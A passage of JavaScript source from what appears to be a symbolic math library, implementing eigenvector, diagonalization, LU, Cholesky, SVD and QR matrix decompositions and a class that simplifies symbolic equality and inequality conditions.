        setResults(eigenvalue, currentEigenvectors.map(function (v) { return new Matrix.Vector(v.elements.map(function (e) { return subs(e); })); }));
      }
    }
    
    return eigenvectors;
  }
  
  for (var i = 0; i < uniqueEigenvalues.length; i += 1) {
    var eigenvalue = uniqueEigenvalues[i];
    var n = matrix.cols();
    // matrix - I * eigenvalue
    var currentEigenvectors = Expression.getSolutionSet(matrix.subtract(Matrix.I(n).scale(eigenvalue)));
    setResults(eigenvalue, currentEigenvectors);
    
    //TODO: REMOVE (use the code above)
    if (i + 1 < uniqueEigenvalues.length && eigenvalue.complexConjugate().equals(uniqueEigenvalues[i + 1]) && matrix.eql(matrix.map(function (e) { return e.complexConjugate(); }))) {
      //TODO:!
      var complexConjugate = function (vector) {
        return new Matrix.Vector(vector.elements.map(function (e) { return e.complexConjugate(); }));
      };
      setResults(uniqueEigenvalues[i + 1], currentEigenvectors.map(function (vector) { return complexConjugate(vector); }));
      i += 1;//TODO: !?
    }
  }
  return eigenvectors;
};

var getInverse = function (A, eigenvalues, T) {
  // https://en.wikipedia.org/wiki/Diagonalizable_matrix : The row vectors of P^âˆ’1 are the left eigenvectors of A
  // https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors#Left_and_right_eigenvectors :  a left eigenvector of A is the same as the transpose of a right eigenvector of A^T, with the same eigenvalue
  var AT = A.transpose();
  var eigenvectors = Expression.getEigenvectors(AT, eigenvalues);
  var T_INVERSED = Matrix.fromVectors(eigenvectors).transpose();
  return _unscaleInverseMatrix(T_INVERSED, T);
};

var _unscaleInverseMatrix = function (T_INVERSED, T) {
  // we know, that the result is {{s_1, 0, 0, 0}, {0, s_2, 0, 0}, {0, 0, s_3, 0}, {0, 0, 0, s_4}}
  var trickyMultiply = function (a, b) {
    var n = a.rows();
    return Matrix.Zero(n, n).map(function (element, i, j) {
      if (i !== j) {
        return Expression.ZERO;
      }
      var rows = n;
      var k = -1;
      while (++k < rows) {
        var current = a.e(i, k).multiply(b.e(k, j));
        element = k === 0 ? current : element.add(current);
      }
      return element;
    });
  };

  var S = trickyMultiply(T_INVERSED, T);
  var S_INVERSED = S.map(function (e, i, j) {
    return i === j ? e.inverse() : Expression.ZERO;
  });

  return S_INVERSED.multiply(T_INVERSED);
};
Expression._unscaleInverseMatrix = _unscaleInverseMatrix;//TODO: make private

// A = T^-1 L T ,T-matrix of own vectors, L - matrix of own values

Expression.diagonalize = function (matrix, eigenvalues, eigenvectors) {
  if (arguments.length > 3) {
    throw new TypeError();
  }
  if (!matrix.isSquare()) {
    throw new RangeError("NonSquareMatrixException");
  }
  if (eigenvalues.length !== matrix.cols()) {
    throw new RangeError();
  }
  if (eigenvectors.filter(function (v) { return v != null; }).length !== matrix.cols()) {
    throw new RangeError();
  }
  // https://en.wikipedia.org/wiki/Jordan_normal_form
  // A is diagonalizable if and only if, for every eigenvalue Î» of A, its geometric and algebraic multiplicities coincide.

  // TODO: text
  //!!!
  var L = Matrix.I(matrix.cols()).map(function (element, i, j) {
    return (i === j ? eigenvalues[i] : Expression.ZERO);
  });
  var T = Matrix.fromVectors(eigenvectors);

  //var T_INVERSED = T.inverse();
  var T_INVERSED = T.isExact() ? T.inverse() : getInverse(matrix, eigenvalues, T);

  return {T: T, L: L, T_INVERSED: T_INVERSED};
};

Expression.LUDecomposition = function (matrix) {
  //https://en.wikipedia.org/wiki/LU_decomposition#Code_examples
  //TODO: remove(?) - matrix.toRowEchelon(...)
  var N = matrix.rows();
  var a = matrix;
  var Lower = Matrix.I(N);
  var P = Matrix.I(N);
  var swapFlag = false;
  var pivotRow = 0;
  for (var n = 0; n < matrix.cols(); n += 1) {
    if (pivotRow < N) {
      var c = pivotRow;
      if (a.e(pivotRow, n).equals(Expression.ZERO)) {
        for (var k = pivotRow + 1; k < N && c === pivotRow; k += 1) {
          if (!a.e(k, n).equals(Expression.ZERO)) {
            c = k;
          }
        }
        if (c !== pivotRow) {
          var S = Matrix.I(N);
          S = S.map(function (element, i, j) {
            return i === pivotRow ? S.e(c, j) : (i === c ? S.e(pivotRow, j) : element);
          });
          a = S.multiply(a);
          Lower = S.multiply(Lower.subtract(Matrix.I(N))).add(Matrix.I(N));
          P = S.multiply(P);
          swapFlag = true;
        }
      }
      if (!a.e(pivotRow, n).equals(Expression.ZERO)) {
        var L = Matrix.I(N).map(function (element, i, j) {
          return j === pivotRow && i >= pivotRow + 1 ? a.e(i, n).divide(a.e(pivotRow, n)).negate() : element;
        });
        a = L.multiply(a);
        Lower = Lower.multiply(L);
        pivotRow += 1;
      }
    }
  }
  Lower = Lower.map(function (element, i, j) {
    return i === j ? element : element.negate();
  });
  return {
    swapFlag: swapFlag,
    P: new Expression.Matrix(P),
    A: new Expression.Matrix(matrix),
    L: new Expression.Matrix(Lower),
    U: new Expression.Matrix(a)
  };
};

Expression.isReal = function (e) {
  var isReal = function (e) {
    if (e instanceof Expression.Integer) {
      return true;
    }
    if (e instanceof Expression.NthRoot) {
      return isReal(e.a);
    }
    if (e instanceof Expression.BinaryOperation) {
      return isReal(e.a) && isReal(e.b);
    }
    if (e === Expression.E || e === Expression.PI) {
      return true;
    }
    if (e instanceof Expression.Function) {
      return isReal(e.a);
    }
    if (e instanceof Expression.PolynomialRootSymbol) {
      return true;//TODO: ?
    }
    if (e instanceof Expression.ExpressionWithPolynomialRoot) {
      return isReal(e.e);
    }
    if (e instanceof Expression.ExpressionPolynomialRoot) {
      return true;
    }
    return false;
  };
  return isReal(e);
};
Expression.isRealMatrix = function (A) {
  for (var i = 0; i < A.rows(); i += 1) {
    for (var j = 0; j < A.cols(); j += 1) {
      if (!Expression.isReal(A.e(i, j))) {
        return false;
      }
    }
  }
  return true;
};
Expression.CholeskyDecomposition = function (matrix) {
  var A = matrix;

  // check if A is square
  if (!A.isSquare()) {
    throw new RangeError("NonSquareMatrixException");
  }

  var n = A.rows();

  // check if A from R
  var isReal = Expression.isRealMatrix(A);

  // check if A is symmetric
  for (var i = 0; i < n; i += 1)  {
    for (var j = i; j < n; j += 1) {
      if (!A.e(i, j).equals(A.e(j, i).complexConjugate())) {
        if (isReal) {
          throw new RangeError("NonSymmetricMatrixException");
        } else {
          throw new RangeError("NonHermitianMatrixException");
        }
      }
    }
  }

  var L = new Array(n);
  for (var i = 0; i < n; i += 1) {
    L[i] = new Array(n);
    for (var j = 0; j < n; j += 1) {
      L[i][j] = Expression.ZERO;
    }
  }

  for (var j = 0; j < n; j += 1) {
    for (var i = j; i < n; i += 1) {
      var e = null;
      if (j === i) {
        var sum = null;
        for (var k = 0; k < j; k += 1) {
          var s = L[j][k].multiply(L[j][k].complexConjugate());
          sum = sum == null ? s : sum.add(s);
        }
        var x = sum == null ? A.e(j, j) : A.e(j, j).subtract(sum);
        //TODO: fix
        if (!Expression._isPositive(x)) {
          throw new RangeError("NonPositiveDefiniteMatrix");
        }
        e = x.squareRoot();
      } else {
        var sum = null;
        for (var k = 0; k < j; k += 1) {
          var x = L[i][k].multiply(L[j][k].complexConjugate());
          sum = sum == null ? x : sum.add(x);
        }
        e = (sum == null ? A.e(i, j) : A.e(i, j).subtract(sum)).divide(L[j][j]);
      }
      L[i][j] = e;
      console.log("l_%d%d = %s", i + 1, j + 1, L[i][j].toString());
    }
  }
  return {
    L: Matrix.padRows(L, null)
  };
};


Matrix.prototype.conjugateTranspose = function () {
  return this.transpose().map(function (e) { return e.complexConjugate(); });
};

Matrix.fromVectors = function (vectors) {
  if (vectors.length === 0) {
    throw new RangeError();
  }
  var dimensions = vectors[0].dimensions();
  for (var i = 0; i < vectors.length; i += 1) {
    if (vectors[i].dimensions() !== dimensions) {
      throw new RangeError();
    }
  }
  return Matrix.Zero(dimensions, vectors.length).map(function (e, i, j) { return vectors[j].e(i); });
};

Expression.SVD = function (matrix) {
  // TODO: see email 
  // https://en.wikipedia.org/wiki/Singular_value_decomposition#Calculating_the_SVD
  // TODO: see https://web.mit.edu/be.400/www/SVD/Singular_Value_Decomposition.htm
  // The left-singular vectors of M are a set of orthonormal eigenvectors of MM*.
  var helper = function (matrix, eigenvectors) {
    //console.info('We need to orthonormalize eigenvectors so the matrix with those vectors as columns will be unitary:');
    if (eigenvectors.length > 1) {//TODO: https://math.stackexchange.com/questions/82467/eigenvectors-of-real-symmetric-matrices-are-orthogonal#answer-82471
      eigenvectors = GramSchmidtOrthogonalization(eigenvectors);
    } else {
      //console.debug('Eigenvectors of real symmetric matrices corresponding to distinct eigenvalues are orthogonal'); // no need to show (?)
    }
    return eigenvectors.map(function (vector) { return vector.toUnitVector(); });
  };
  var MstarM = matrix.conjugateTranspose().multiply(matrix);
  var eigenvalues = Expression.getEigenvalues(MstarM); // use MstarM to have zero eigenvalues to make the set of eigenvectors full for V
  //!
  eigenvalues = eigenvalues.map(function (eigenvalue) { return eigenvalue instanceof Expression.ExpressionWithPolynomialRoot || eigenvalue instanceof Expression.ExpressionPolynomialRoot ? eigenvalue.upgrade() : eigenvalue; });
  //!

  eigenvalues = eigenvalues.slice(0).reverse().sort(function (a, b) {
    var diff = a.subtract(b);
    if (!Expression.isReal(diff)) {
      return NaN;//TODO: !?
    }
    return diff.compareTo(Expression.ZERO) > 0 ? -1 : 1;
  });

  //var Vstar = ExpressionParser.parse(matrix.toString()).transformEquality(ExpressionParser.parse(U.multiply(Sigma).toString() + '*' + 'X', ExpressionParser.parse.c).simplify());
  
  //console.info('M^{*}M (M^T*M) has the same non-negative eigenvalues as M*M^{*} (M*M^T)')
  var V = [];
  var diagonal = [];
  //TODO:
  //console.info('   eigenvectors: ');
  var uniqueEigenvalues = Expression.unique(eigenvalues);
  var eigenvectors = Expression.getEigenvectors(MstarM, eigenvalues);
  for (var iteratoreigenvalue = uniqueEigenvalues[globalThis.Symbol.iterator](), eigenvalue = iteratoreigenvalue.next().value; eigenvalue != null; eigenvalue = iteratoreigenvalue.next().value) {
    var eigenvalueEigenvectors = eigenvectors.filter(function (v, i) { return eigenvalues[i] === eigenvalue; });
    V = V.concat(helper(MstarM, eigenvalueEigenvectors));
    var entry = eigenvalue.squareRoot();
    // https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors#Eigenspaces,_geometric_multiplicity,_and_the_eigenbasis_for_matrices
    // https://people.math.carleton.ca/~kcheung/math/notes/MATH1107/wk12/12_singular_value_decomposition.html
    // it says, that geometric multiplicity of a _positive_ eigenvalue of A*A^T is the same as geometric multiplicity of A^T*A and same as algebraic multipliciy.
    // and those matrices has the same eigenvalues
    //var geometricMultiplicity = multiplicities[i] === 1 ? 1 : MMstar.cols() - MMstar.subtract(Matrix.I(MMstar.cols()).scale(eigenvalue)).rank();//?
    var geometricMultiplicity = V.length - diagonal.length;
    diagonal = diagonal.concat(new Array(geometricMultiplicity).fill(entry));
  }
  var Sigma = Matrix.Zero(matrix.rows(), matrix.cols()).map(function (e, i, j) { return (i === j && i < diagonal.length ? diagonal[i] : Expression.ZERO); });

  // see https://www.d.umn.edu/~mhampton/m4326svd_example.pdf
  //TODO: compute V or U using the property instead of the current variant of computation (?)
  
  console.time('U');
  var U = [];
  for (var i = 0; i < Sigma.rows() && i < Sigma.cols() && !Sigma.e(i, i).equals(Expression.ZERO); i += 1) {
    //TODO: another method when multiplicity is 1 - ? (for performance)
    var u_i = matrix.multiply(V[i]).col(0).scale(Sigma.e(i, i).inverse());
    U.push(u_i);
  }
  if (U.length < matrix.rows()) { // not enough vectors
    //TODO: details
    console.time('U1');
    var MMstar = matrix.multiply(matrix.conjugateTranspose());
    var eigenvectors = Expression.getEigenvectors(MMstar, new Array(matrix.rows()).fill(Expression.ZERO), true).filter(function (v) { return v != null; });
    var U2b = helper(MMstar, eigenvectors);
    console.timeEnd('U1');
    console.assert(U.length + U2b.length === matrix.rows());
    U = U.concat(U2b);
  }
  console.timeEnd('U');

  //var Vstar = s.multiply(U.inverse().multiply(matrix));
  //var Vstar = U.conjugateTranspose().multiply(matrix);
  //console.log(U.multiply(U.conjugateTranspose()).toString());
  //console.log(Vstar.multiply(Vstar.conjugateTranspose()).toString());

  U = Matrix.fromVectors(U);
  V = Matrix.fromVectors(V);
  return {U: U, Sigma: Sigma, Vstar: V.conjugateTranspose()};
};

Expression.QRDecomposition = function (matrix) {
  var A = matrix;
  // https://en.wikipedia.org/wiki/QR_decomposition#Example
  var columnVectors = new Array(A.cols());
  for (var i = 0; i < A.cols(); i += 1) {
    columnVectors[i] = A.col(i);
  }
  var U = GramSchmidtOrthogonalization(columnVectors).filter(function (vector) { return !vector.eql(Matrix.Vector.Zero(vector.dimensions())); });
  var Q = Matrix.fromVectors(U.map(function (vector) { return vector.toUnitVector(); }));
  var R = Q.conjugateTranspose().multiply(A);
  console.log(Q);
  return {
    Q: Q,
    R: R
  };
};


})();
(function () {
"use strict";



function Condition(array) {
  Object.freeze(array);
  this.array = array;
}

Condition.NEZ = " != 0";
Condition.EQZ = " == 0";

Condition.GTZ = " > 0";
//Condition.GTEZ = " >= 0";

Condition.prototype._and = function (operator, e) {
  //console.log('_and', e.toString(), this === Condition.FALSE || this === Condition.TRUE ? '' : this.toString());
  if (operator !== Condition.NEZ && operator !== Condition.EQZ && operator !== Condition.GTZ) {
    throw new TypeError();
  }
  if (e == undefined) {
    throw new RangeError();
  }
  if (this === Condition.FALSE) {
    return this;
  }

  var contains = function (array, operator, e) {
    for (var i = 0; i < array.length; i += 1) {
      if (array[i].operator === operator && array[i].expression.equals(e)) {
        return true;
      }
    }
    return false;
  };

  if (e instanceof Expression.GF2Value) {
    return this._and(operator, e.value === 0 ? Expression.ZERO : Expression.ONE);//?
  }

  var add = function (oldArray, y) {

    //TODO: y is const
    if (contains(oldArray, y.operator, y.expression)) {//!TODO: it should work even without this (?)
      return oldArray;
    }
    if (contains(oldArray, y.operator === Condition.EQZ ? Condition.NEZ : Condition.EQZ, y.expression)) {
      return null;
    }

    var operator = null;// to not use a variable from scope accidently
    var e = y.expression;//!

  //!new 2019-12-15:
  //!substitute:  x = 0, sin(x) != 0
  if (Expression.has(e, Expression.Sin) ||
      Expression.has(e, Expression.Cos) ||
      Expression.has(e, Expression.Exponentiation) ||
      Expression.has(e, Expression.Arctan) ||
      Expression.has(e, Expression.Logarithm) ||
      Expression.has(e, Expression.Abs)) {
    if (oldArray.length > 0) {//TODO: test, fix
    e = Expression._map(function (x) {
      if (x instanceof Expression.Function && !(x instanceof Expression.NthRoot) ||
          x instanceof Expression.Exponentiation && (!(x.b instanceof Expression.Integer) || !(x.a instanceof Expression.Symbol))) {
        var r = x instanceof Expression.Exponentiation ? x.b : x.a;
        var arg = null;
        var array = null;
        if (!(r instanceof Expression.Symbol)) {
          arg = new Expression.Symbol('arg');
          array = add(oldArray, {expression: arg.subtract(r), operator: Condition.EQZ});
          if (array == null) {
            //! TODO: fix, should not happen
            return x;
          }
        } else {
          arg = r;
          array = oldArray;
        }
        for (var i = 0; i < array.length; i += 1) {//TODO: fix
          var y = array[i];
          if (y.operator === Condition.EQZ) {
            var polynomial = Polynomial.toPolynomial(y.expression, arg);
            if (polynomial.getDegree() === 1) {
              var yy = polynomial.getCoefficient(0).negate().divide(polynomial.getCoefficient(1));
              if (!Expression.has(yy, Expression.Function)) {// sin(yy)/cos(yy) is supported
              if (yy.compare4Addition(arg) < 0 && !(yy instanceof Expression.Division) || Expression.isConstant(yy) || Expression.isConstant(yy.divide(Expression.PI))) {//TODO: fix
                if (x instanceof Expression.Exponentiation) {
                  //?TODO: tests
                  return x.a.pow(yy);
                } else if (x instanceof Expression.Arctan) {
                  return yy.arctan();
                } else if (x instanceof Expression.Logarithm) {
                  return yy.logarithm();
                } else if (x instanceof Expression.Abs) {
                  return yy.abs();
                } else {
                  yy = Expression.isConstant(yy) && !(yy.equals(Expression.ZERO)) && !(yy instanceof Expression.Radians) && !Expression.has(yy, Expression.Symbol) ? new Expression.Radians(yy) : yy;
                  if (x instanceof Expression.Sin) {
                    return yy.sin();
                  } else if (x instanceof Expression.Cos) {
                    return yy.cos();
                  } else {
                    throw new TypeError("NotSupportedError");
                  }
                }
              }
              }
            }
          }
        }
        return x;
      }
      return x;
    }, e);
    y = {expression: e, operator: y.operator};//TODO: fix
    }
  }
  //!

    //!new
    if (e.isNegative() && (y.operator === Condition.EQZ || y.operator === Condition.NEZ)) {
      return add(oldArray, {expression: e.negate(), operator: y.operator});
    }

    // (x-1)^(1/2)
    if (e instanceof Expression.Exponentiation// &&
        //e.b.getNumerator() instanceof Expression.Integer &&
        //!e.b.getDenominator().equals(Expression.ONE)
        ) {
      if (y.operator === Condition.EQZ || y.operator === Condition.NEZ) {
        return add(oldArray, {expression: e.a, operator: y.operator});
      }
    }

    // (4*k+1)^(1/2)+1
    if (e instanceof Expression.Addition &&
        e.a instanceof Expression.Exponentiation &&
        Expression.isConstant(e.b) && //!
        e.a.b.getDenominator() instanceof Expression.Integer &&
        !e.a.b.getDenominator().equals(Expression.ONE)) {
      if (e.a.b.getDenominator().remainder(Expression.TWO).equals(Expression.ZERO) && !e.b.isNegative()) {
        return add(oldArray, {expression: Expression.ONE, operator: y.operator});
      }
      //if (!e.b.negate().pow(e.a.b.inverse()).pow(e.a.b).equals(e.b.negate())) {
      //  return add(oldArray, {expression: Expression.ONE, operator: y.operator});
      //}
      //TODO: fix
      return add(oldArray, {expression: e.a.a.pow(e.a.b.getNumerator()).subtract(e.b.negate().pow(e.a.b.getDenominator())), operator: y.operator});
    }

    if (y.expression instanceof Expression.Multiplication && y.expression.b instanceof Expression.IdentityMatrix) {
      return add(oldArray, {expression: y.expression.a, operator: y.operator});
    }
    if (y.expression instanceof Expression.Division) {
      var tmp = oldArray;
      tmp = add(tmp, {expression: y.expression.a, operator: y.operator});
      if (tmp == null) {
        return null;
      }
      tmp = add(tmp, {expression: y.expression.b, operator: Condition.NEZ});
      return tmp;
    }
    /*if (y.expression instanceof Expression.Division && Expression.isConstant(y.expression.b)) {
      y = {
        expression: y.expression.a,
        operator: y.operator
      };
    }*/
    if (y.expression instanceof Expression.Integer || y.expression instanceof Expression.Complex) {
      if (y.operator === Condition.NEZ && y.expression.equals(Expression.ZERO) ||
          y.operator === Condition.EQZ && !y.expression.equals(Expression.ZERO)) {
        return null;
      }
      if (y.operator === Condition.GTZ && y.expression.equals(Expression.ZERO)) {//TODO: fix
        return null;
      }
      if (y.operator === Condition.GTZ && y.expression instanceof Expression.Integer && y.expression.compareTo(Expression.ZERO) < 0) {//TODO: fix
        return null;
      }
      return oldArray;
    }
    //TODO: check code coverage, remove extra branches
    if (Expression.isConstant(y.expression) && !y.expression.equals(Expression.ZERO)) {
      if (y.operator === Condition.NEZ) {
        return oldArray;
      }
      if (y.operator === Condition.EQZ) {
        return null;
      }
    }
    if (y.expression instanceof Expression.Matrix) {
      if (y.expression.matrix.isZero()) {
        if (y.operator === Condition.EQZ) {
          return oldArray;
        }
        if (y.operator === Condition.NEZ) {
          return null;
        }
      }
    }
    if (y.expression instanceof Expression.NthRoot) {
      return add(oldArray, {expression: y.expression.a, operator: y.operator});
    }
    if (y.expression instanceof Expression.Multiplication) {
      if (y.operator === Condition.EQZ) {
        if (y.expression.a instanceof Expression.Integer && !y.expression.a.equals(Expression.ZERO)) {
          //TODO: fix - ?
          y = {
            expression: y.expression.b,
            operator: y.operator
          };
          return add(oldArray, y);
        }
      }
      if (y.operator === Condition.NEZ) {
        var tmp = oldArray;
        tmp = add(tmp, {expression: y.expression.a, operator: Condition.NEZ});
        if (tmp == null) {
          return null;
        }
        tmp = add(tmp, {expression: y.expression.b, operator: Condition.NEZ});
        return tmp;
      }
    }

    var p = Expression.getMultivariatePolynomial(y.expression);
    if (p != null) {
      //!new 2018-12-24
      //TODO: fix (?Polynomial#getContent()?)
        var t = Expression.getNthRootConjugate(p.p.getLeadingCoefficient());
        if (t != undefined && Expression.isConstant(t)) {//TODO: fix
          return add(oldArray, {expression: t.multiply(y.expression), operator: y.operator});
        }
      //!
      var content = p.p.getContent();
      if (!content.equals(Expression.ONE) && !content.equals(Expression.ONE.negate())) {
        // content * y.expression.divide(content)
        if (y.operator === Condition.NEZ) {
          var tmp = add(oldArray, {expression: y.expression.divide(content), operator: Condition.NEZ});
          if (tmp == null) {
            return null;
          }
          return add(tmp, {expression: content, operator: Condition.NEZ});
        }
        while (p != null) {
          if (y.operator === Condition.EQZ) {
            var sf = p.p.getSquareFreePolynomial();
            if (sf.getDegree() !== p.p.getDegree()) {
              //?
              return add(oldArray, {expression: y.expression.divide(p.p.divideAndRemainder(sf).quotient.calcAt(p.v)), operator: Condition.EQZ});
            }
          }
          content = p.p.getContent();
          p = Expression.getMultivariatePolynomial(content);
        }
        //!new
        if (Expression.isConstant(content)) {
          if (!content.equals(Expression.ONE) && !content.equals(Expression.ONE.negate())) {
            return add(oldArray, {expression: y.expression.divide(content), operator: Condition.EQZ});
          }
        }
        //y = {
        //  expression: y.expression.divide(content),
        //  operator: y.operator
        //};
      }
      if (p != null && p.p.getDegree() > 1 && p.p.getCoefficient(0).equals(Expression.ZERO)) {
        if (y.operator === Condition.NEZ) {
          var tmp = add(oldArray, {expression: p.v, operator: Condition.NEZ});
          if (tmp == null) {
            return null;
          }
          return add(tmp, {expression: y.expression.divide(p.v), operator: Condition.NEZ});
        }
      }
    }

    //!new 2019-12-24:
    var p = Expression.getMultivariatePolynomial(y.expression);
    if (p != null && p.p.getDegree() > 1) {
      var sf = p.p.getSquareFreePolynomial();
      if (sf.getDegree() !== p.p.getDegree()) {//TODO: test, fix
        if (y.operator === Condition.EQZ || y.operator === Condition.NEZ) {
          return add(oldArray, {expression: sf.calcAt(p.v), operator: y.operator});
        }
      }
    }
    //!

    var addRest = function (newArray, oldArray, i, other) {
      if (newArray == null) {
        return null;
      }
      for (var j = i + 1; j < oldArray.length; j += 1) {
        newArray = add(newArray, oldArray[j]);
        if (newArray == null) {
          return null;
        }
      }
      if (other != null) {
        newArray = add(newArray, other);
      }
      return newArray;
    };


    var newArray = [];
    for (var i = 0; i < oldArray.length; i += 1) {
      var x = oldArray[i]; // TODO: const


      // (e**(tx)-e**(-tx))/(2i)
      // (e**(tx)+e**(-tx))/2

      // sin(x)=0, cos(x)=0
      //!new 2020-01-01:
      if (Expression.has(x.expression, Expression.Sin) || Expression.has(x.expression, Expression.Cos)) {
        if (Expression.has(y.expression, Expression.Sin) || Expression.has(y.expression, Expression.Cos)) {
          var xx = {
            operator: x.operator,
            expression: Expression._replaceSinCos(x.expression)
          };
          var yy = {
            operator: y.operator,
            expression: Expression._replaceSinCos(y.expression)
          };
          var tmp1 = add([], xx);
          if (tmp1 == null) {
            return null;
          }
          var tmp = add(tmp1, yy);
          if (tmp == null) {
            return null;
          }
          if (tmp.length === 0) {
            return [];//TODO: remove
          }
          if (tmp.length === 1) {
            return addRest(newArray, oldArray, i, {operator: tmp[0].operator, expression: Expression._replaceBySinCos(tmp[0].expression)});
          }
          //TODO: ?
          //for (var i = 0; i < tmp.length; i++) {
          //  newArray = add(newArray, {operator: tmp[i].operator, expression: Expression._replaceBySinCos(tmp[i].expression)});
          //}
          //return addRest(newArray, oldArray, i, {operator: Condition.EQZ, expression: Expression.ZERO});

          // cos(y)=0, r*sin(y)=0
          for (var i = 0; i < tmp.length; i++) {
            if (!Expression.has(tmp[i], Expression.Exponentiation)) {//TODO: ?
              if (tmp[i].expression.gcd(y.expression).equals(tmp[i].expression)) {
                newArray = add(newArray, x);
                return addRest(newArray, oldArray, i, {operator: tmp[i].operator, expression: Expression._replaceBySinCos(tmp[i].expression)});
              }
            }
          }

        }
      }
      //!
      if (Expression.has(x.expression, Expression.Function) || Expression.has(x.expression, Expression.Exponentiation)) {
        if (!(Expression.has(y.expression, Expression.Function) || Expression.has(y.expression, Expression.Exponentiation))) {
          return addRest(add(newArray, y), oldArray, i, x);
        }
      }

      if ((x.operator === Condition.NEZ && y.operator === Condition.EQZ ||
           x.operator === Condition.EQZ && y.operator === Condition.NEZ) &&
           (Expression.isSingleVariablePolynomial(x.expression.multiply(y.expression)) || true)) {
        var g = x.expression.polynomialGCD(y.expression);
        //var g = x.expression.gcd(y.expression);
        while (!g.equals(Expression.ONE) && !g.equals(Expression.ONE.negate())) {
          if (x.operator === Condition.EQZ) {
            x = {
              operator: x.operator,
              expression: x.expression.divide(g)
            };
            // the change may affect all previous conditions:
          } else { // y.operator === Condition.EQZ
            y = {
              operator: y.operator,
              expression: y.expression.divide(g)
            };
            // we have not checked the y agains the branches in the beginning of the "add"
          }
          newArray = add(newArray, x);
          if (newArray == null) {
            return null;
          }
          return addRest(newArray, oldArray, i, y);
          //g = x.expression.gcd(y.expression);
        }
        //if (x.operator === Condition.EQZ) {
        //  var tmp = y;
        //  y = x;
        //  x = tmp;
        //}
        if (x.operator === Condition.EQZ && Expression.isConstant(x.expression)) {
          return null;
        }
        if (y.operator === Condition.EQZ && Expression.isConstant(y.expression)) {
          return null;
        }
        //if (!Expression.isSingleVariablePolynomial(x.expression.multiply(y.expression))) {
        //  if (x.operator === Condition.EQZ) {
        //    newArray.push(y);
        //  } else {
        //    newArray.push(x);
        //  }
        //}
      }
      var newMethodEnabled = true;
      var singleVariablePolynomials = Expression.isSingleVariablePolynomial(x.expression) &&
                                      Expression.isSingleVariablePolynomial(y.expression) &&
                                      Expression.isSingleVariablePolynomial(x.expression.multiply(y.expression));
      if (x.operator === Condition.NEZ && y.operator === Condition.EQZ && singleVariablePolynomials) {
        y = y;
      } else if (x.operator === Condition.EQZ && y.operator === Condition.NEZ && singleVariablePolynomials) {
        y = x;
      } else if (x.operator === Condition.EQZ && y.operator === Condition.EQZ && singleVariablePolynomials) {
        var g = x.expression.polynomialGCD(y.expression);
        //var g = x.expression.gcd(y.expression);
        if (g instanceof Expression.Integer) {
          return null;
        }
        y = {
          operator: y.operator,
          expression: g
        };
        return addRest(newArray, oldArray, i, y);
      } else if (x.operator === Condition.NEZ && y.operator === Condition.NEZ && singleVariablePolynomials) {
        var g = x.expression.gcd(y.expression);
        x = {
          operator: x.operator,
          expression: x.expression.divide(g)
        };
        if (!Expression.isConstant(x.expression)) {
          newArray.push(x);
        }
      } else { // !isSingleVariablePolynomial
        // TODO: use Expression.isSingleVariablePolynomial(x.expression.multiply(y.expression))) here, and remove in the branches above


        //!new 2020-16-02
        var getConstant = function (e) {
          if (e instanceof Expression.Multiplication && e.a instanceof Expression.Matrix) {//TODO: ?
            return e.a.multiply(getConstant(e.b));
          }
          var c = Expression.getConstant(e);
          for (var iteratorf = e.divide(c).factors()[globalThis.Symbol.iterator](), f = iteratorf.next().value; f != null; f = iteratorf.next().value) {
            if (f instanceof Expression.NthRoot && Expression.isConstant(f.a)) {
              c = c.multiply(f);
            }
          }
          return c;
        };
        var collapse = function (e, candidate) { // sqrt(2)*x*y+2*x*y
          var term0 = candidate.divide(getConstant(candidate));
          var result = Expression.ZERO;
          for (var iteratora = e.summands()[globalThis.Symbol.iterator](), a = iteratora.next().value; a != null; a = iteratora.next().value) {
            var term = a.divide(getConstant(a));
            if (term.equals(term0)) {
              result = result.add(a);
            }
          }
          return result;
        };
        var getPivotMonomial = function (e) {
          // https://en.wikipedia.org/wiki/Monomial_order#Lexicographic_order
          //TODO: change compare4Addition (?)
          var getExponent = function (x) {
            return x instanceof Expression.Exponentiation ? x.b : Expression.ONE;
          };
          var getBase = function (x) {
            return x instanceof Expression.Exponentiation ? x.a : x;
          };
          var totalDegree = function (e) {
            var result = Expression.ZERO;
            for (var iteratorf = e.factors()[globalThis.Symbol.iterator](), f = iteratorf.next().value; f != null; f = iteratorf.next().value) {
              if (!Expression.isConstant(f)) {
                var e = getExponent(f);
                //if (e instanceof Expression.Integer) {//?
                  result = result.add(e);
                //}
              }
            }
            return result;
          };
          var compare = function (x, y) {
            //TODO: better order (see Wikipedia)
            var s = totalDegree(x).subtract(totalDegree(y));
            var c = s.isNegative() ? -1 : (s.negate().isNegative() ? +1 : 0);
            if (c !== 0) {
              return c;
            }
            //return x.compare4Addition(y);
            //TODO: change Expression#compare4Addition - ?
            var reversedFactors = function (e) {
              return Array.from(e.divide(Expression.getConstant(e)).factors()).reverse().filter(function (e) { return !Expression.isConstant(e); }).values();
            };
            var i = reversedFactors(x);
            var j = reversedFactors(y);
            var a = i.next().value;
            var b = j.next().value;
            while (a != null && b != null) {
              var c = (0 - getBase(a).compare4Multiplication(getBase(b))) || getExponent(a).compare4Multiplication(getExponent(b));
              if (c !== 0) {
                return c;
              }
              a = i.next().value;
              b = j.next().value;
            }
            return a != null ? +1 : (b != null ? -1 : 0);
          };
          var candidate = null;
          for (var iteratora = e.summands()[globalThis.Symbol.iterator](), a = iteratora.next().value; a != null; a = iteratora.next().value) {
            if (candidate == null || compare(a, candidate) > 0) {
              candidate = a;
            }
          }
          return candidate;
        };
        if (newMethodEnabled && x.operator === Condition.EQZ) {
          var pivot = getPivotMonomial(x.expression);
          var p = pivot.divide(getConstant(pivot))._abs();
          pivot = collapse(x.expression, pivot);
          var newYExpression = y.expression;
          var c1 = 0;
          for (var iteratora = y.expression.summands()[globalThis.Symbol.iterator](), a = iteratora.next().value; a != null; a = iteratora.next().value) {
            if (a.gcd(p)._abs().equals(p)) {
              newYExpression = newYExpression.subtract(a.divide(pivot).multiply(x.expression));
              c1 += 1;
            }
          }
          if (c1 > 0) {
            return addRest(add(newArray, x), oldArray, i, {expression: newYExpression, operator: y.operator});
          }
        }
        if (newMethodEnabled && y.operator === Condition.EQZ) {
          var pivot = getPivotMonomial(y.expression);
          var p = pivot.divide(getConstant(pivot))._abs();
          pivot = collapse(y.expression, pivot);
          for (var iteratora = x.expression.summands()[globalThis.Symbol.iterator](), a = iteratora.next().value; a != null; a = iteratora.next().value) {
            if (a.gcd(p)._abs().equals(p)) {
              var newXExpression = x.expression.subtract(a.divide(pivot).multiply(y.expression));
